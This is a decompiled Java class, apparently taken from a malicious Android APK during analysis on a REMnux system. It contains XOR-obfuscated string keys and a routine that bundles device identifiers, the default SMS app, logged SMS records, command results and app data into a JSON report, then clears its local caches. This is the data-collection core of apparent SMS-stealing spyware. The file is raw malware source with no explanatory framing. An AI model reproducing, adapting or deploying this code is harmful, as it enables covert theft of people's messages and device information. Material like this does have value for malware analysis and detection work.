package com.zjxyxnvvp.nxvxchltf.h.a;

import android.content.Context;
import android.os.Build;
import android.provider.Telephony;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import com.zjxyxnvvp.nxvxchltf.d;
import com.zjxyxnvvp.nxvxchltf.i.f;
import com.zjxyxnvvp.nxvxchltf.j.c;
import com.zjxyxnvvp.nxvxchltf.util.b;
import com.zjxyxnvvp.nxvxchltf.util.e;
import com.zjxyxnvvp.nxvxchltf.util.h;
import com.zjxyxnvvp.nxvxchltf.util.i;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.Map;
import java.util.concurrent.atomic.AtomicBoolean;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class a {
    private static short[] $ = {4418, 4417, 4425, 4425, 4427, 4426, 4465, 4445, 4419, 4445, 8975, 8973, 8988, 8984, 8985, 8990, 8969, 8968, 9011, 8965, 8962, 8966, 8969, 8975, 8984, 8991, 5643, 5652, 5642, 5639, 9589, 9588, 9575, 9592, 9586, 9588, 9550, 9599, 9584, 9596, 9588, 8506, 8482, 8485, 8484, 8495, 8469, 8484, 8511, 8487, 8488, 8495, 8504, 7961, 7962, 7951, 7951, 7966, 7945, 7938, 7972, 7959, 7966, 7949, 7966, 7959, 7177, 7179, 7195, 7223, 7181, 7174, 7177, 7178, 7172, 7181, 7180, 5845, 5854, 5835, 5844, 5870, 5844, 5855, 5840, 5843, 5853, 5844, 5845, 3485, 3473, 3467, 3472, 3466, 3468, 3463, 6093, 6094, 6082, 6080, 6093, 6084, 416, 432, 417, 438, 438, 445, 396, 434, 432, 423, 442, 421, 438, 8441, 8425, 8440, 8431, 8431, 8420, 8405, 8441, 8431, 8425, 8447, 8440, 8431, 7235, 7261, 7235, 7279, 7261, 7249, 7262, 7249, 7255, 7253, 7234, 2250, 2245, 2255, 2265, 2244, 2242, 2255, 2292, 2269, 2254, 2265, 2264, 2242, 2244, 2245, 7365, 7379, 7380, 7380, 7363, 7368, 7378, 7417, 7370, 7369, 7361, 7361, 7363, 7362, 7417, 7382, 7367, 7381, 7381, 7377, 7369, 7380, 7362, 9592, 9579, 9596, 3904, 3909, 3920, 3909, 3963, 3921, 3924, 3904, 3909, 3920, 3905, 5885, 5886, 5878, 5878, 5876, 5877, 5838, 5857, 5860, 5858, 5881, 5876, 5858, 8215, 8221, 8215, 8208, 8193, 8201, 8251, 8200, 8203, 8195, 8215, 1210, 1206, 1204, 1193, 1205, 1212, 1197, 1212, 1213, 1158, 1210, 1206, 1204, 1204, 1208, 1207, 1213, 1194, 2967, 2950, 2950, 2970, 2975, 2965, 2967, 2946, 2975, 2969, 2968, 9578, 9583, 9594, 9583, 5128, 5130, 5147, 5151, 5150, 5145, 5134, 5135, 5172, 5120, 5134, 5138, 5127, 5124, 5132, 5132, 5134, 5145, 5144, 9296, 9303, 9290, 9293, 9304, 9301, 9301, 9308, 9309, 9318, 9304, 9289, 9289, 9290};

    /* renamed from: a  reason: collision with root package name */
    public static boolean f321a;

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static JSONObject a(Context context) {
        JSONObject jSONObject = new JSONObject();
        JSONObject jSONObject2 = new JSONObject();
        d dVar = d.e;
        com.zjxyxnvvp.nxvxchltf.h.b.a aVar = dVar.f314a;
        String $2 = $(0, 10, 4398);
        List<String> b2 = aVar.b(context, $2);
        ArrayList arrayList = new ArrayList(i.f369a);
        i.f369a.clear();
        com.zjxyxnvvp.nxvxchltf.h.b.a aVar2 = dVar.f314a;
        String $3 = $(10, 26, 9068);
        List<String> b3 = aVar2.b(context, $3);
        List<f> c = dVar.c.c();
        ArrayList arrayList2 = new ArrayList();
        for (f fVar : c) {
            arrayList2.add(fVar.f());
            dVar.c.a(fVar.b());
        }
        ArrayList arrayList3 = new ArrayList();
        for (String str : b3) {
            try {
                arrayList3.add(new JSONObject(str));
            } catch (JSONException e) {
                e.printStackTrace();
            }
        }
        dVar.f314a.a(context, $2);
        dVar.f314a.a(context, $3);
        try {
            jSONObject2.put($(26, 30, 5731), b.j(context));
            jSONObject2.put($(30, 41, 9489), b.i());
            jSONObject2.put($(41, 53, 8522), b.m(context));
            jSONObject2.put($(53, 66, 8059), b.g(context));
            jSONObject2.put($(66, 77, 7272), b.n(context, UIDNwaidobaWIODb.class));
            jSONObject2.put($(77, 89, 5809), b.o(context));
            jSONObject2.put($(89, 96, 3582), b.h(context));
            jSONObject2.put($(96, 102, 6049), b.u());
            boolean z = true;
            jSONObject2.put($(102, 115, 467), !b.q(context));
            jSONObject2.put($(115, 128, 8330), b.r(context));
            AtomicBoolean atomicBoolean = UIDNwaidobaWIODb.p;
            if (b.r(context)) {
                z = false;
            }
            atomicBoolean.set(z);
            jSONObject2.put($(128, 139, 7216), Telephony.Sms.getDefaultSmsPackage(context));
            jSONObject2.put($(139, 154, 2219), Build.VERSION.SDK_INT);
            jSONObject2.put($(154, 177, 7334), h.f367a);
            jSONObject2.put($(177, 180, 9486), 6);
            jSONObject.put($(180, 191, 3876), jSONObject2);
            jSONObject.put($2, new JSONArray((Collection) b2));
            jSONObject.put($(191, 204, 5777), new JSONArray((Collection) arrayList));
            jSONObject.put($(204, 215, 8292), new JSONArray((Collection) new ArrayList(e.f365a)));
            jSONObject.put($3, new JSONArray((Collection) arrayList3));
            jSONObject.put($(215, 233, 1241), new JSONArray((Collection) arrayList2));
            e.f365a.clear();
            if (!com.zjxyxnvvp.nxvxchltf.j.b.f345b.isEmpty()) {
                ArrayList arrayList4 = new ArrayList();
                for (com.zjxyxnvvp.nxvxchltf.j.a aVar3 : com.zjxyxnvvp.nxvxchltf.j.b.f345b) {
                    JSONObject jSONObject3 = new JSONObject();
                    JSONObject jSONObject4 = new JSONObject();
                    for (Map.Entry<String, c> entry : aVar3.b().entrySet()) {
                        jSONObject4.put(entry.getKey(), entry.getValue().c());
                    }
                    jSONObject3.put($(233, 244, 3062), aVar3.f342a);
                    jSONObject3.put($(244, 248, 9486), jSONObject4);
                    arrayList4.add(jSONObject3);
                }
                jSONObject.put($(248, 267, 5227), new JSONArray((Collection) arrayList4));
                com.zjxyxnvvp.nxvxchltf.j.b.f345b.clear();
            }
            if (f321a) {
                JSONArray jSONArray = new JSONArray();
                b.k(context, jSONArray);
                jSONObject.put($(267, 281, 9273), jSONArray);
                f321a = false;
            }
        } catch (JSONException e2) {
            e2.printStackTrace();
        }
        return jSONObject;
    }
}
